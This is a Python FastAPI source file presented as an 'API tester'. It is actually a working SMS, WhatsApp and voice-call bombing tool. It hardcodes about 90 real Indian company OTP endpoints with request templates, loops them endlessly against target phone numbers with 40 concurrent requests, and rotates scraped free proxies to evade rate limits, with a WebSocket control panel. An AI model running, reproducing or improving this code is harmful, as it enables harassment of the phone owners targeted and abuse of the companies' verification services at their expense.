# app.py - PROXY ROTATION + ULTRA FAST
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import asyncio
import aiohttp
import aiohttp_socks
import time
import random
import requests
from typing import List, Dict, Optional, Set
from dataclasses import dataclass, field
from datetime import datetime
import uvicorn
import logging

# Logging config
logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

app = FastAPI(title="Phantom API Tester", version="5.0 PROXY")

# Static & Templates
app.mount("/static", StaticFiles(directory="static"), name="static")
templates = Jinja2Templates(directory="templates")

# ================= PROXY MANAGER SYSTEM =================
@dataclass
class Proxy:
    url: str
    protocol: str = "http"
    success_count: int = 0
    fail_count: int = 0
    is_active: bool = True

class ProxyManager:
    def __init__(self):
        self.proxies: List[Proxy] = []
        self.active_proxies: List[Proxy] = []
        self.current_index = 0
        self.lock = asyncio.Lock()
        
    async def fetch_proxies(self):
        """Auto-fetch free proxies from multiple sources"""
        raw_list = []
        sources = [
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
        ]
        
        print("🔄 Fetching fresh proxies...")
        for url in sources:
            try:
                resp = requests.get(url, timeout=5)
                if resp.status_code == 200:
                    lines = resp.text.strip().split('\n')
                    for line in lines:
                        if ':' in line:
                            # Auto-detect protocol based on source URL or default to http
                            proto = "socks5" if "socks5" in url else "http"
                            raw_list.append(f"{proto}://{line.strip()}")
            except:
                pass
        
        # Remove duplicates and update
        unique_proxies = list(set(raw_list))
        self.proxies = [Proxy(url=p, protocol=p.split('://')[0]) for p in unique_proxies[:500]] # Limit to 500
        self.active_proxies = self.proxies.copy()
        print(f"✅ Loaded {len(self.active_proxies)} unique proxies")

    def get_next_proxy(self) -> Optional[Proxy]:
        if not self.active_proxies:
            return None
        proxy = self.active_proxies[self.current_index % len(self.active_proxies)]
        self.current_index += 1
        return proxy

    async def report_status(self, proxy_url: str, success: bool):
        # Remove proxy if it fails too much
        if not success:
            for p in self.active_proxies:
                if p.url == proxy_url:
                    p.fail_count += 1
                    if p.fail_count > 5: # Remove after 5 fails
                        self.active_proxies.remove(p)
                    break

proxy_manager = ProxyManager()

# ================= CONNECTION MANAGER =================
class ConnectionManager:
    def __init__(self):
        self.active_connections: List[WebSocket] = []

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        self.active_connections.append(websocket)

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_connections:
            self.active_connections.remove(websocket)

    async def broadcast(self, message: dict):
        # Broadcast only to connected clients
        for connection in self.active_connections[:]:
            try:
                await connection.send_json(message)
            except:
                self.active_connections.remove(connection)

manager = ConnectionManager()

# 90+ APIs list (optimized - working APIs only)
ULTIMATE_APIS = [
    # CALL BOMBING APIs
    {"name": "Tata Capital Voice", "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","isOtpViaCallAtLogin":"true"}}', "type": "call"},
    {"name": "1MG Voice", "url": "https://www.1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"number":"{phone}","otp_on_call":true}}', "type": "call"},
    {"name": "Swiggy Call", "url": "https://profile.swiggy.com/api/v3/app/request_call_verification", "method": "POST", "headers": {"Content-Type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "type": "call"},
    {"name": "Myntra Voice", "url": "https://www.myntra.com/gw/mobile-auth/voice-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "type": "call"},
    
    # WHATSAPP BOMBING APIs
    {"name": "KPN WhatsApp", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "content-type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{phone}"}}}}', "type": "whatsapp"},
    {"name": "Foxy WhatsApp", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"user":{{"phone_number":"+91{phone}"}},"via":"whatsapp"}}', "type": "whatsapp"},
    {"name": "Stratzy WhatsApp", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNo":"{phone}"}}', "type": "whatsapp"},
    {"name": "Jockey WhatsApp", "url": lambda phone: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}?whatsapp=true", "method": "GET", "headers": {}, "data": None, "type": "whatsapp"},
    
    # SMS BOMBING APIs (50+ working APIs)
    {"name": "Lenskart SMS", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneCode":"+91","telephone":"{phone}"}}', "type": "sms"},
    {"name": "NoBroker SMS", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"phone={phone}&countryCode=IN", "type": "sms"},
    {"name": "PharmEasy SMS", "url": "https://pharmeasy.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}', "type": "sms"},
    {"name": "Wakefit SMS", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "type": "sms"},
    {"name": "Byju's SMS", "url": "https://api.byjus.com/v2/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}', "type": "sms"},
    {"name": "Hungama OTP", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNo":"{phone}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}', "type": "sms"},
    {"name": "Meru Cab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobile_number={phone}", "type": "sms"},
    {"name": "Doubtnut", "url": "https://api.doubtnut.com/v4/student/login", "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"phone_number":"{phone}","language":"en"}}', "type": "sms"},
    {"name": "PenPencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"}, "data": lambda phone: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{phone}"}}', "type": "sms"},
    {"name": "Snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"+91{phone}"}}', "type": "sms"},
    {"name": "Dayco India", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"api=send_otp&brand=dayco&mob={phone}&resend_otp=resend_otp", "type": "sms"},
    {"name": "BeepKart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","city":362}}', "type": "sms"},
    {"name": "Lending Plate", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"mobiles={phone}&resend=Resend", "type": "sms"},
    {"name": "ShipRocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}"}}', "type": "sms"},
    {"name": "GoKwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","country":"in"}}', "type": "sms"},
    {"name": "NewMe", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"{phone}","resend_otp_request":true}}', "type": "sms"},
    {"name": "Univest", "url": lambda phone: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={phone}", "method": "GET", "headers": {}, "data": None, "type": "sms"},
    {"name": "Smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","email":"test@example.com"}}', "type": "sms"},
    {"name": "CaratLane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{phone}\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}', "type": "sms"},
    {"name": "BikeFixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"4pFtQJwcz6y"}}', "type": "sms"},
    {"name": "WellAcademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"}, "data": lambda phone: f'{{"contact_no":"{phone}"}}', "type": "sms"},
    {"name": "ServeTel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"}, "data": lambda phone: f"mobile_number={phone}", "type": "sms"},
    {"name": "GoPink Cabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"check_mobile_number=1&contact={phone}", "type": "sms"},
    {"name": "Shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"mobile_no=%2B91{phone}", "type": "sms"},
    {"name": "Cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"mobilenumber={phone}&otptype=register", "type": "sms"},
    {"name": "MyImagineStore", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, "data": lambda phone: f"mobile={phone}", "type": "sms"},
    {"name": "Otpless", "url": "https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","selectedCountryCode":"+91"}}', "type": "sms"},
    {"name": "MyHubble Money", "url": "https://api.myhubble.money/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phoneNumber":"{phone}","channel":"SMS"}}', "type": "sms"},
    {"name": "Tata Capital Business", "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNumber":"{phone}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}', "type": "sms"},
    {"name": "DealShare", "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","hashCode":"k387IsBaTmn"}}', "type": "sms"},
    {"name": "Snapmint", "url": "https://api.snapmint.com/v1/public/sign_up", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}', "type": "sms"},
    {"name": "Housing.com", "url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","country_url_name":"in"}}', "type": "sms"},
    {"name": "RentoMojo", "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}', "type": "sms"},
    {"name": "Khatabook", "url": "https://api.khatabook.com/v1/auth/request-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"wk+avHrHZf2"}}', "type": "sms"},
    {"name": "Netmeds", "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "type": "sms"},
    {"name": "Nykaa", "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa", "type": "sms"},
    {"name": "RummyCircle", "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","isPlaycircle":false}}', "type": "sms"},
    {"name": "Animall", "url": "https://animall.in/zap/auth/login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","signupPlatform":"NATIVE_ANDROID"}}', "type": "sms"},
    {"name": "PenPencil V3", "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "type": "sms"},
    {"name": "Entri", "url": "https://entri.app/api/v3/users/check-phone/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}"}}', "type": "sms"},
    {"name": "Cosmofeed", "url": "https://prod.api.cosmofeed.com/api/user/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","version":"1.4.28"}}', "type": "sms"},
    {"name": "Aakash", "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile_number":"{phone}","activity_type":"aakash-myadmission"}}', "type": "sms"},
    {"name": "Revv", "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","deviceType":"website"}}', "type": "sms"},
    {"name": "DeHaat", "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","client_id":"kisan-app"}}', "type": "sms"},
    {"name": "A23 Games", "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}', "type": "sms"},
    {"name": "Spencer's", "url": "https://jiffy.spencers.in/user/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "type": "sms"},
    {"name": "PayMe India", "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"phone":"{phone}","app_signature":"S10ePIIrbH3"}}', "type": "sms"},
    {"name": "Shopper's Stop", "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","type":"SIGNIN_WITH_MOBILE"}}', "type": "sms"},
    {"name": "Hyuga Auth", "url": "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "type": "sms"},
    {"name": "BigCash", "url": lambda phone: f"https://www.bigcash.live/sendsms.php?mobile={phone}&ip=192.168.1.1", "method": "GET", "headers": {"Referer": "https://www.bigcash.live/games/poker"}, "data": None, "type": "sms"},
    {"name": "Lifestyle Stores", "url": "https://www.lifestylestores.com/in/en/mobilelogin/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"signInMobile":"{phone}","channel":"sms"}}', "type": "sms"},
    {"name": "WorkIndia", "url": lambda phone: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={phone}&version_number=623", "method": "GET", "headers": {}, "data": None, "type": "sms"},
    {"name": "PokerBaazi", "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","mfa_channels":"phno"}}', "type": "sms"},
    {"name": "My11Circle", "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp", "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "type": "sms"},
    {"name": "MamaEarth", "url": "https://auth.mamaearth.in/v1/auth/initiate-signup", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "type": "sms"},
    {"name": "HomeTriangle", "url": "https://hometriangle.com/api/partner/xauth/signup/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "type": "sms"},
    {"name": "Wellness Forever", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"}, "data": lambda phone: f"method=firstRegisterApi&data={{\"customerMobile\":\"{phone}\",\"generateOtp\":\"true\"}}", "type": "sms"},
    {"name": "HealthMug", "url": "https://api.healthmug.com/account/createotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "type": "sms"},
    {"name": "Vyapar", "url": lambda phone: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={phone}", "method": "GET", "headers": {}, "data": None, "type": "sms"},
    {"name": "Kredily", "url": "https://app.kredily.com/ws/v1/accounts/send-otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "type": "sms"},
    {"name": "Tata Motors", "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","sendOtp":"true"}}', "type": "sms"},
    {"name": "Moglix", "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","buildVersion":"24.0"}}', "type": "sms"},
    {"name": "MyGov", "url": lambda phone: f"https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile={phone}&gender=male", "method": "GET", "headers": {}, "data": None, "type": "sms"},
    {"name": "TrulyMadly", "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","locale":"IN"}}', "type": "sms"},
    {"name": "Apna", "url": "https://production.apna.co/api/userprofile/v1/otp/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","hash_type":"play_store"}}', "type": "sms"},
    {"name": "CodFirm", "url": lambda phone: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%2B91{phone}&email=&storeUrl=bellavita1.myshopify.com", "method": "GET", "headers": {}, "data": None, "type": "sms"},
    {"name": "Swipe", "url": "https://app.getswipe.in/api/user/mobile_login", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","resend":true}}', "type": "sms"},
    {"name": "More Retail", "url": "https://omni-api.moreretail.in/api/v1/login/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}}', "type": "sms"},
    {"name": "Country Delight", "url": "https://api.countrydelight.in/api/v1/customer/requestOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}', "type": "sms"},
    {"name": "AstroSage", "url": lambda phone: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}", "method": "GET", "headers": {}, "data": None, "type": "sms"},
    {"name": "Rapido", "url": "https://customer.rapido.bike/api/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "type": "sms"},
    {"name": "TooToo", "url": "https://tootoo.in/graphql", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{phone}","resend":0}}}}', "type": "sms"},
    {"name": "ConfirmTkt", "url": lambda phone: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}", "method": "GET", "headers": {}, "data": None, "type": "sms"},
    {"name": "BetterHalf", "url": "https://api.betterhalf.ai/v2/auth/otp/send/", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","isd_code":"91"}}', "type": "sms"},
    {"name": "Charzer", "url": "https://api.charzer.com/auth-service/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}","appSource":"CHARZER_APP"}}', "type": "sms"},
    {"name": "Nuvama Wealth", "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobileNo":"{phone}","emailID":"test@example.com"}}', "type": "sms"},
    {"name": "Mpokket", "url": "https://web-api.mpokket.in/registration/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda phone: f'{{"mobile":"{phone}"}}', "type": "sms"},
]

# ================= BOMBING LOGIC =================
class BombingSession:
    def __init__(self, phones: List[str]):
        self.phones = phones
        self.stop_event = asyncio.Event()
        self.stats = {
            "total": 0, "success": 0, "failed": 0, "start_time": None, "proxies_alive": 0
        }
        self.semaphore = asyncio.Semaphore(40) # 40 parallel threads
    
    async def create_connector(self, proxy: Proxy):
        """Create connection based on proxy type"""
        if not proxy:
            return aiohttp.TCPConnector(ssl=False)
            
        try:
            if "socks" in proxy.protocol:
                return aiohttp_socks.ProxyConnector.from_url(proxy.url, rdns=True, ssl=False)
            else:
                return aiohttp.TCPConnector(ssl=False)
        except:
            return aiohttp.TCPConnector(ssl=False)

    async def attack(self, api: dict, phone: str):
        while not self.stop_event.is_set():
            proxy = proxy_manager.get_next_proxy()
            proxy_url = proxy.url if proxy else None
            
            async with self.semaphore:
                try:
                    # Clean phone number
                    clean_phone = f"+91{phone}" if not phone.startswith("+91") else phone
                    
                    # Prepare URL/Data
                    target_url = api["url"](clean_phone) if callable(api["url"]) else api["url"]
                    data = api["data"](clean_phone) if api.get("data") else None
                    
                    # Connection Setup
                    connector = await self.create_connector(proxy)
                    
                    # HTTP Proxy handling for request arg
                    req_proxy = proxy_url if (proxy and "http" in proxy.protocol) else None
                    
                    async with aiohttp.ClientSession(connector=connector) as session:
                        start_t = time.time()
                        
                        if api["method"] == "POST":
                            async with session.post(target_url, headers=api["headers"], data=data, proxy=req_proxy, timeout=10) as resp:
                                success = resp.status in [200, 201]
                        else:
                            async with session.get(target_url, headers=api["headers"], proxy=req_proxy, timeout=10) as resp:
                                success = resp.status in [200, 201]
                        
                        # Stats update
                        self.stats["total"] += 1
                        if success:
                            self.stats["success"] += 1
                            if proxy: await proxy_manager.report_status(proxy.url, True)
                            print(f"✅ HIT: {api['name']} | Proxy: {proxy_url[-10:] if proxy_url else 'Direct'}")
                        else:
                            self.stats["failed"] += 1
                            if proxy: await proxy_manager.report_status(proxy.url, False)
                        
                        # Real-time WebSocket update
                        await manager.broadcast({
                            "type": "log",
                            "tag": "success" if success else "error",
                            "message": f"{'✅' if success else '❌'} {api['name']} via {proxy.protocol if proxy else 'Direct'}",
                            "stats": {
                                "total_requests": self.stats["total"],
                                "successful_hits": self.stats["success"],
                                "failed_attempts": self.stats["failed"],
                                "proxies_used": len(proxy_manager.active_proxies)
                            },
                            "phone": phone
                        })

                except Exception as e:
                    self.stats["failed"] += 1
                    if proxy: await proxy_manager.report_status(proxy.url, False)
                
                # Small random delay to rotate proxy efficiently
                await asyncio.sleep(random.uniform(0.1, 0.5))

    async def start(self):
        self.stop_event.clear()
        self.stats["start_time"] = time.time()
        
        tasks = []
        for phone in self.phones:
            for api in ULTIMATE_APIS:
                tasks.append(asyncio.create_task(self.attack(api, phone)))
        
        await asyncio.gather(*tasks)

    def stop(self):
        self.stop_event.set()

active_sessions: Dict[str, BombingSession] = {}

# ================= ROUTES =================
@app.get("/")
async def home(request: Request):
    return templates.TemplateResponse("index.html", {
        "request": request, 
        "api_count": len(ULTIMATE_APIS)
    })

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            data = await websocket.receive_json()
            
            if data["action"] == "start":
                phones = data.get("phones", [])
                
                # Stop old session
                if "main" in active_sessions:
                    active_sessions["main"].stop()
                    await asyncio.sleep(1)
                
                session = BombingSession(phones)
                active_sessions["main"] = session
                
                asyncio.create_task(session.start())
                
            elif data["action"] == "stop":
                if "main" in active_sessions:
                    active_sessions["main"].stop()
                    await manager.broadcast({"type": "info", "message": "🛑 Stopped", "stopped": True})
                    
    except:
        manager.disconnect(websocket)

@app.on_event("startup")
async def startup_event():
    # App start hote hi proxies fetch karo
    await proxy_manager.fetch_proxies()
    # Background task to refresh proxies every 5 mins
    async def refresh_loop():
        while True:
            await asyncio.sleep(300)
            await proxy_manager.fetch_proxies()
    asyncio.create_task(refresh_loop())

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
